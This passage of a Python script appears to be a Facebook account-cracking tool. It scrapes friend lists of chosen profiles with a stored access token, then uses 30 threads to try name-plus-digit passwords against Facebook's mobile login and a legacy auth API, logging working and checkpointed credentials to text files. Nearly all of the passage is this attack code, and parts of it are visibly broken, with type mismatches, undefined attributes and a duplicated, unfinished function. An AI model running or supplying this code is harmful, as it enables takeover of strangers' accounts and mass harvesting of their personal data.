                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass3)
                                ok=open('RK-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass3)
                                    cp=open('RK-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = first+ps3
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://mbasic.facebook.com')
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass4)
                                        ok=open('RK-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass4)
                                            cp=open('RK-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5 = last+ps4
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://mbasic.facebook.com')
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass5)
                                                ok=open('RK-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass5)
                                                    cp=open('RK-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print ("\x1b[1;97m")
    print (39*'-')
    print ("[!] cloning complete result ........")
    print (39*'-')
    print ('[!] total ok ids : '+str(len(oks)))
    print ('[!] total cp ids : '+str(len(cps)))
    print (39*'-')
    print ('')
    input(' Press enter to back ')
    fb_menu()
            
        








        



























def n_p_pass():
    id1="4"
    id2="4"
    id3="4"
    id4="4"
    id5="4"
    token=open('token.txt','r').read()
    os.system('clear')
    print (logo)
    print ("")
    print (" [ Maximum Limit 5 ]")
    print ("")
    ty=int(input('[!] How Many Pass Do You Want To Add : '))
    if ty=="1":
        print ("")
        ps1=int(input("[1] Enter digit : "))
        pass
    elif ty=="2":
        ps1=int(input("[1] Enter digit : "))
        ps2=int(input("[2] Enter digit : "))
        pass
    elif ty=="3":
        ps1=int(input("[1] Enter digit : "))
        ps2=int(input("[2] Enter digit : "))
        ps3=int(input("[3] Enter digit : "))
        pass
    elif ty=="4":
        ps1=int(input("[1] Enter digit : "))
        ps2=int(input("[2] Enter digit : "))
        ps3=int(input("[3] Enter digit : "))
        ps4=int(input("[4] Enter digit : "))
        pass
    elif ty=="5":
        ps1=int(input("[1] Enter digit : "))
        ps2=int(input("[2] Enter digit : "))
        ps3=int(input("[3] Enter digit : "))
        ps4=int(input("[4] Enter digit : "))
        ps5=int(input("[5] Enter digit : "))
    
  
    print ("")
    print (" [ Maximum Limit 5 ]")
    print ("")
    ty=int(input('[!] How Many Links Do You Want To Clone: '))
    print ("")
    if ty==int=="1":
        print ("")
        idt=int(input("[1] Enter ID : "))
        pass
    elif ty=="2":
        idt=int(input("[1] Enter ID : "))
        id2=int(input("[2] Enter ID : "))
        pass
    elif ty=="3":
        idt=int(input("[1] Enter ID : "))
        id2=int(input("[2] Enter ID : "))
        id3=int(input("[3] Enter ID : "))
        pass
    elif ty=="4":
        idt=int(input("[1] Enter ID : "))
        id2=int(input("[2] Enter ID : "))
        id3=int(input("[3] Enter ID : "))
        id4=int(input("[4] Enter ID : "))
        pass
    elif ty=="5":
        idt=int(input("[1] Enter ID : "))
        id2=int(input("[2] Enter ID : "))
        id3=int(input("[3] Enter ID : "))
        id4=int(input("[4] Enter ID : "))
        id5=int(input("[5] Enter ID : "))
    else:
        print ("invlid option")
        time.sleep(2)
        fb_menu()
    
    
    r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    z = json.loads(r.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r2 = requests.get('https://graph.facebook.com/' + id2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r3 = requests.get('https://graph.facebook.com/' + id3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r4 = requests.get('https://graph.facebook.com/' + id4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r5 = requests.get('https://graph.facebook.com/' + id5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
        
         
    print ("[!] total ids : "+str(len(idx)))
    os.system('echo " -----------------------------------"| lolcat')
    print ("        Cracking Start Please Wait .. ")
    print (" Agar Idz Nhi Aa Rahe To (Airplane) Flight Mod Use Kro")
    os.system('echo " -----------------------------------"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        try:
            first = name.rsplit(' ')[0]
            last = name.rsplit(' ')[1]
            
            pass1 = name
            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
            q = json.loads(data)
            if "access_token" in q:
                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass1)
                
                ok=open('RK-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
                
            else:
                if "www.facebook.com" in q ["error_msg"]:
                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass1)
                    cp=open('RK-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2= first+ps1
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                    q = json.loads(data)
                    if "access_token" in q:
                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass2)
                        ok=open('RK-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if "www.facebook.com" in q ["error_msg"]:
                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass2)
                            cp=open('RK-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3=  first+ps2
                            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                            q = json.loads(data)
                            if "access_token" in q:
                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass3)
                                ok=open('RK-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if "www.facebook.com" in q ["error_msg"]:
                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass3)
                                    cp=open('RK-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4= first+ps3
                                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                                    q = json.loads(data)
                                    if "access_token" in q:
                                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass4)
                                        ok=open('RK-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if "www.facebook.com" in q ["error_msg"]:
                                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass4)
                                            cp=open('RK-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5= last+ps4
                                            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                                            q = json.loads(data)
                                            if "access_token" in q:
                                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass5)
                                                ok=open('RK-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if "www.facebook.com" in q ["error_msg"]:
                                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass5)
                                                    cp=open('RK-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print ("\x1b[1;97m")
    print (39*'-')
    print ("[!] cloning complete result ........")
    print (39*'-')
    print ('[!] total ok ids : '+str(len(oks)))
    print ('[!] total cp ids : '+str(len(cps)))
    print (39*'-')
    print ('')
    input(' Press enter to back ')
    fb_menu()


def n_p_pass():
    id2="4"
    id3="4"
    id4="4"
    id5="4"
    token=open('token.txt','r').read()
    os.system('clear')
    print (logo)
    print ("")
    ps1=int(input('[1] name + digit : '))
    ps2=int(input('[2] name + digit : '))
    ps3=int(input('[4] name + digit : '))
    ps4=int(input('[4] Last + Name  : '))



def p_p_pass():
    id2="4"
    id3="4"
    id4="4"
    id5="4"
    token=open('token.txt','r').read()
    os.system('clear')
    print (logo)
    print ("")
    print (" [ Maximum Limit 5 ]")
    print ("")
    ty=int(input('[!] How Many Pass Do You Want To Add: '))
    print ("")
    if ty==int("1"):
        print ("")
        ps1=int(input("[1] Enter Pass : "))
        pass
    elif ty==int("2"):
        ps1=int(input("[1] Enter Pass : "))
        ps1=input("[2] Enter Pass : ")
        pass
    elif ty==int("3"):
        ps1=input("[1] Enter Pass : ")
        ps1=input("[2] Enter Pass : ")
        ps1=input("[3] Enter Pass : ")
        pass
    elif ty==int("4"):
        ps1=input("[1] Enter Pass : ")
        ps1=input("[2] Enter Pass : ")
        ps1=input("[3] Enter Pass : ")
        ps1=input("[4] Enter Pass : ")
        pass
    elif ty==int("5"):
        ps1=input("[1] Enter Pass : ")
        ps1=input("[2] Enter Pass : ")
        ps1=input("[3] Enter Pass : ")
        ps1=input("[4] Enter Pass : ")
        ps1=input("[5] Enter Pass : ")
    print ("")
    print (" [ Maximum Limit5 ]")
    
    print ("")
    ty=input('[!] How Many Links Do You Want To Clone : ')
    print ("")
    if ty=="1":
        print ("")
        idt=input("[1] Enter ID : ")
        pass
    elif ty=="2":
        idt=input("[1] Enter ID : ")
        id2=input("[2] Enter ID : ")
        pass
    elif ty=="3":
        idt=input("[1] Enter ID : ")
        id2=input("[2] Enter ID : ")
        id3=input("[3] Enter ID : ")
        pass
    elif ty=="4":
        idt=input("[1] Enter ID : ")
        id2=input("[2] Enter ID : ")
        id3=input("[3] Enter ID : ")
        id4=input("[4] Enter ID : ")
        pass
    elif ty=="5":
        idt=input("[1] Enter ID : ")
        id2=input("[2] Enter ID : ")
        id3=input("[3] Enter ID : ")
        id4=input("[4] Enter ID : ")
        id5=input("[5] Enter ID : ")
    else:
        print ("invlid option")
        time.sleep(2)
        fb_menu()
    
    
    
    r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    z = json.loads(r.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r2 = requests.get('https://graph.facebook.com/' + id2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r3 = requests.get('https://graph.facebook.com/' + id3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r4 = requests.get('https://graph.facebook.com/' + id4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    r5 = requests.get('https://graph.facebook.com/' + id5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        idx.append(uid + '|' + na)
    
    print ("[!] total ids : "+str(len(idx)))
    os.system('echo " -----------------------------------"| lolcat')
    print ("   Cracking Start Please Wait ..")
    print ("  Use Flight Mode For Speed Up")
    os.system('echo " -----------------------------------"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        try:
            pass1 = ps1
            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
            q = json.loads(data)
            if "access_token" in q:
                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass1)
                
                ok=open('RK-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
                
            else:
                if "www.facebook.com" in q ["error_msg"]:
                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass1)
                    cp=open('RK-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2=sys.ps2
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                    q = json.loads(data)
                    if "access_token" in q:
                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass2)
                        ok=open('RK-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if "www.facebook.com" in q ["error_msg"]:
                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass2)
                            cp=open('RK-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3=sys.ps3
                            data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                            q = json.loads(data)
                            if "access_token" in q:
                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass3)
                                ok=open('RK-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if "www.facebook.com" in q ["error_msg"]:
                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass3)
                                    cp=open('RK-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4=sys.ps4
                                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                                    q = json.loads(data)
                                    if "access_token" in q:
                                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass4)
                                        ok=open('RK-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if "www.facebook.com" in q ["error_msg"]:
                                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass4)
                                            cp=open('RK-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print ("\x1b[1;97m")
    print (39*'-')
    print ("[!] Cloning Complete Result ........")
    print (39*'-')
    print ('[!] Total Ok Ids: '+str(len(oks)))
    print ('[!] Total Cp Ids : '+str(len(cps)))
    print (39*'-')
    print ('')
    input(' Press Enter To Back')
    fb_menu()


def grap():
        os.system('clear')
        print (logo)
        print ("")
        print ("")
        print ("\t     [ File Making ]")
        print ("")
        print ("\t  [ Maximum Limit 10 IDs ]")
        print ("")
        c=int(input("[!] How Many Links Do You Want To Dump : "))
        if c==int('1'):
            ext1()
        elif c==int('2'):
            ext2()
        elif c==int('3'):
            ext3()
        elif c==int('4'):
            ext4()
        elif c==int('5'):
            ext5()
        elif c==int('6'):
            ext6()
        elif c==int('7'):
            ext7()
        elif c==int('8'):
            ext8()
        elif c==int('9'):
            ext9()
        elif c==int('10'):
            ext10()
          
        else:
            main()
         
        main()


def mineExt():
    hok=('jok.txt')
    count=[]
    rana=[]
    try:
        token=open('token.txt','r').read()
    except:
        main()
    os.system('clear')
    print (logo)
    print ("")
    iiid=input("[*] Enter ID : ")
    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
    q=json.loads(rrp.text)
    nid=q ['name']
    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("look.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ("")
    print (sm+"[*] Extracting From : "+nid+" > \x1b[1;91mFriends")
    print ("")
    time.sleep(2)
    print (gu+"[*] Graping URLs ......"+w)
    print ("")
    time.sleep(2)
    print (g+"[*] Graping Complte Process Start *"+w)
    print ("")
    os.system(' cat look.txt | grep "100077" >> kk.txt')
    os.system(' cat look.txt | grep "100078" >> kk.txt')
    os.system('rm -rf look.txt')
    file=open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From IMTIAZ : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From IMTIAZ : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[*] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ("")
    print ("")
    print (sm+"[*] Total Extract ids : "+str(len(count))+w)
    print ("")
    mvt=input("[=] Enter Path To Save File : ")
    print ("[*] Your File Save in : "+mvt)
    shutil.move(hok,mvt)
    os.system('rm -rf jok.txt')
    input('[=] Press Enter To Back')
    main()



file="file.txt"

def ext1():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main()
    print ("")
    d1=int(input('[1] Enter ID : '))
        
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
        
    fuck.close()
    cop=str(input('[!] File path : '))
    shutil.move(file,cop)
    print (' [*] Your File Save In : '+cop)
    input('[!] Press Enter To Back')
    main()

def ext2():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main()
    print ("")
    d1=int(input('[1] Enter ID : '))
    d2=int(input('[2] Enter ID : '))
        
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
